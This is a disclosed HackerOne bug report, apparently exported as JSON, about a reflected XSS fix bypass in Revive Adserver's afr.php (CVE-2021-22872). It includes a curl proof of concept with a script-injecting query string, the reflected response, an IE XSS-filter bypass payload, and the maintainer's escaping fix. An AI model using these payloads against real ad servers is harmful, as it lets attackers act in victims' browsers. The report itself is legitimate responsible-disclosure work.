{"id":986365,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85ODYzNjU=","url":"https://hackerone.com/reports/986365","title":"Reflected XSS on /www/delivery/afr.php (bypass of report #775693)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-09-19T23:56:40.221Z","submitted_at":"2020-09-19T23:56:40.255Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"axfla","url":"/axfla","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/iA2GYaBLrKuND2gkUS1Bf17B/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2367,"url":"https://hackerone.com/revive_adserver","handle":"revive_adserver","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/367/4f47a5b4a364515d4bbdc17550d67ea5415363cd_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/367/4f47a5b4a364515d4bbdc17550d67ea5415363cd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Revive Adserver","twitter_handle":"revive_adserver","website":"https://www.revive-adserver.com","about":"Revive Adserver is a free open source ad serving system"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2021-22872"],"singular_disclosure_disabled":false,"disclosed_at":"2021-01-19T15:30:37.986Z","bug_reporter_agreed_on_going_public_at":"2021-01-19T15:30:37.901Z","team_member_agreed_on_going_public_at":"2021-01-19T15:21:32.861Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"It is possible to bypass the first fix of this XSS by closing the script tag, and then opening a new one. cURL PoC is trivial :\n\n`curl \"https://revive-instance/www/delivery/afr.php?refresh=10000\u0026\u003c/script\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\"`\n\nThe response will be :\n\n```\n\u003c!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'\u003e\n\u003chtml xmlns='http://www.w3.org/1999/xhtml' xml:lang='en' lang='en'\u003e\n\u003chead\u003e\n\u003ctitle\u003eAdvertisement\u003c/title\u003e\n\n    \u003cscript type='text/javascript'\u003e\u003c!--// \u003c![CDATA[\n        setTimeout('window.location.replace(\"https://revive-instance/www/delivery/afr.php?refresh=10000\u0026\u003c/script\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u0026loc=\")', 10000000);\n    // ]]\u003e --\u003e\u003c/script\u003e\u003cnoscript\u003e\u003cmeta http-equiv='refresh' content='10000;url=https://revive-instance/www/delivery/afr.php?refresh=10000\u0026amp;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026amp;loc='\u003e\u003c/noscript\u003e\n    \u003cstyle type='text/css'\u003e\nbody {margin:0; height:100%; background-color:transparent; width:100%; text-align:center;}\n\u003c/style\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\n\u003c/body\u003e\n\u003c/html\u003e\n\n## Impact\n\nAn attacker can perform arbitrary actions on behalf of the victim.","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2021-02-18T15:21:32.983Z","allow_singular_disclosure_after":-20305619.859605823,"singular_disclosure_allowed":true,"vote_count":16,"voters":["realtess","demonia","mrsinister15","akashhamal0x01","kali_linux_1337_pixel_gamer_yt","mattix","gr000m","fl4va","elias_oh","tkamdi","and 6 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":154,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/revive-adserver/revive-adserver","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9268660,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"HI axfla, thanks for the report.\n\nI've tried the same URL on Firefox and Chrome and the result was correct as they urlencode the \"\u003c\u003e\"s. No script execution of any kind. Aside from sending the curl output to a browser manually, how would you think this can be exploitable?\n\nCheers","automated_response":false,"created_at":"2020-09-20T08:29:36.910Z","updated_at":"2020-09-20T08:29:36.910Z","actor":{"username":"mbeccati","cleared":false,"url":"/mbeccati","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Vb1MGAtUFpEE4kdMaxxr1ACZ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9268661,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2020-09-20T08:29:44.514Z","updated_at":"2020-09-20T08:29:44.514Z","actor":{"username":"mbeccati","cleared":false,"url":"/mbeccati","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Vb1MGAtUFpEE4kdMaxxr1ACZ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9270233,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi, thank you for your response.\n\nIndeed, \u003c is URL-encoded by the browser, but same goes for \" and '. Reading report #775693, I think it was the same (that is the reason why the other researcher provided a cURL PoC as well, payloads were not decoded by Revive).\nSo yes, to be exploited, it would require a browser that does not encode the query. Inter Explorer versions up to 10 don't URL encode the URL (despite the RFC). IE11 will not encode query parameter's names and values. So those could be used. In IE11, there are built-in XSS filters, but you can't rely on them.\n\nhttps://trustfoundry.net/browser-url-encoding-decoding-and-xss/ is an interesting read about XSS and URL-encoding.\n\nCheers","automated_response":false,"created_at":"2020-09-20T13:16:21.794Z","updated_at":"2020-09-20T13:16:21.794Z","actor":{"username":"axfla","cleared":false,"url":"/axfla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iA2GYaBLrKuND2gkUS1Bf17B/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9270738,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is an additional resource, a blog post by Troy Hunt in which he illustrates that such vulnerabilities can be exploited in IE9 : https://www.troyhunt.com/browser-url-encoding-and-website/","automated_response":false,"created_at":"2020-09-20T15:50:52.055Z","updated_at":"2020-09-20T15:50:52.055Z","actor":{"username":"axfla","cleared":false,"url":"/axfla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iA2GYaBLrKuND2gkUS1Bf17B/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9271148,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It's 2020 and those browsers are hardly relevant. I'm not saying we couldn't do better, but as it is I don't think we can consider this a vulnerability in Revive Adserver.","automated_response":false,"created_at":"2020-09-20T18:03:40.410Z","updated_at":"2020-09-20T18:03:40.410Z","actor":{"username":"mbeccati","cleared":false,"url":"/mbeccati","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Vb1MGAtUFpEE4kdMaxxr1ACZ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9271276,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"But then why was report #775693 accepted and fixed ? They are the exact same vuln, and it was 2020 too. IE11 is provided with windows 10 as of today.","automated_response":false,"created_at":"2020-09-20T18:43:40.851Z","updated_at":"2020-09-20T18:49:58.748Z","actor":{"username":"axfla","cleared":false,"url":"/axfla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iA2GYaBLrKuND2gkUS1Bf17B/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9271323,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is a fix bypass, but what you're telling me is you fixed nothing. Accepting the risk could be an understandable decision - despite the fact that I strongly believe it shoud be fixed, since it is an incorrect handling of user input, and you don't know who your users will be, and if they will need compatibility with older browsers -, but the problem is this decision isn't coherent with the previous one.","automated_response":false,"created_at":"2020-09-20T19:03:56.277Z","updated_at":"2020-09-20T19:03:56.277Z","actor":{"username":"axfla","cleared":false,"url":"/axfla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iA2GYaBLrKuND2gkUS1Bf17B/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9272024,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"`https://revive-instance/www/delivery/afr.php?refresh=10000\u0026\u003c/script\u003e\u003cscript/%00%00v%00%00\u003edocument.location.href=location.hash.slice(1)\u003c/script\u003e#javascript:alert(1)`\n\nHere it is, chained with an IE XSS filter bypass. If you paste this URL in the latest version of IE, XSS will be triggered. Screenshot attached.","automated_response":false,"created_at":"2020-09-20T23:59:09.503Z","updated_at":"2020-09-21T00:03:59.107Z","actor":{"username":"axfla","cleared":false,"url":"/axfla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iA2GYaBLrKuND2gkUS1Bf17B/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9273667,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Fair enough. It's a one character change and the following should do:\n\n`$jsDest = addcslashes(addcslashes($dest, \"\\0..\\37/\\\"\\\\\"), \"'\\\\\");`\n\nCould you please double check?\n\nDue to the expected extremely low percentage of the applicable platforms, it is not an high priority fix and it will be included in the next release a few months from now.\n","automated_response":false,"created_at":"2020-09-21T07:10:59.000Z","updated_at":"2020-09-21T07:10:59.000Z","actor":{"username":"mbeccati","cleared":false,"url":"/mbeccati","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Vb1MGAtUFpEE4kdMaxxr1ACZ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9275446,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Port Swigger suggests Unicode-escaping of user inputs in a JS context (https://portswigger.net/web-security/cross-site-scripting/preventing). In my opinion it would make sense to at least escape \"\u003c\" and \"\u003e\" as well, I think it would be a good idea in the long run, to make sure it's never possible to open a self-closing HTML tag inside a \u003cscript\u003e. That way you would be sure to be safe.\n\nThat being said, I can't think of a way of exploiting it without \"/\" right now. Since the next release is scheduled a few months later, I will think about this and let you know if I can find a payload without \"/\".","automated_response":false,"created_at":"2020-09-21T10:11:41.506Z","updated_at":"2020-09-21T10:11:41.506Z","actor":{"username":"axfla","cleared":false,"url":"/axfla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iA2GYaBLrKuND2gkUS1Bf17B/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9276828,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"I will mark this as resolved for now. When we get closer to the release date we will review this and prepare the disclosure. How would you like to be referenced (username, real name, etc)?","automated_response":false,"created_at":"2020-09-21T12:03:09.609Z","updated_at":"2020-09-21T12:03:09.609Z","actor":{"username":"mbeccati","cleared":false,"url":"/mbeccati","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Vb1MGAtUFpEE4kdMaxxr1ACZ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"axfla","url":"/axfla"},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9276900,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"My real name, Axel Flamcourt, would be perfect, thanks. Before disclosure, could you please remove/redact the screenshot ? I just realised I didn't redact the host in the above screenshot. I came across this issue in Revive while hunting on another bug bounty program.","automated_response":false,"created_at":"2020-09-21T12:12:32.046Z","updated_at":"2020-09-21T12:25:35.472Z","actor":{"username":"axfla","cleared":false,"url":"/axfla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iA2GYaBLrKuND2gkUS1Bf17B/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10409926,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks again for the report. Revive Adserver v5.1.0 has been just released.\nThe Security Advisory https://www.revive-adserver.com/security/revive-sa-2021-001/ has been published and a CVE-ID will be requested.","automated_response":false,"created_at":"2021-01-19T15:21:32.893Z","updated_at":"2021-01-19T15:21:32.893Z","first_to_agree":true,"actor":{"username":"mbeccati","cleared":false,"url":"/mbeccati","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Vb1MGAtUFpEE4kdMaxxr1ACZ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10409990,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you, one more thing I would like to mention about the advisory is that the rXSS worked in the current version of IE as well, ie. IE11. You might want to change this part.","automated_response":false,"created_at":"2021-01-19T15:30:37.931Z","updated_at":"2021-01-19T15:30:37.931Z","actor":{"username":"axfla","cleared":false,"url":"/axfla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iA2GYaBLrKuND2gkUS1Bf17B/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10409991,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-01-19T15:30:38.058Z","updated_at":"2021-01-19T15:30:38.058Z","actor":{"username":"axfla","cleared":false,"url":"/axfla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iA2GYaBLrKuND2gkUS1Bf17B/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}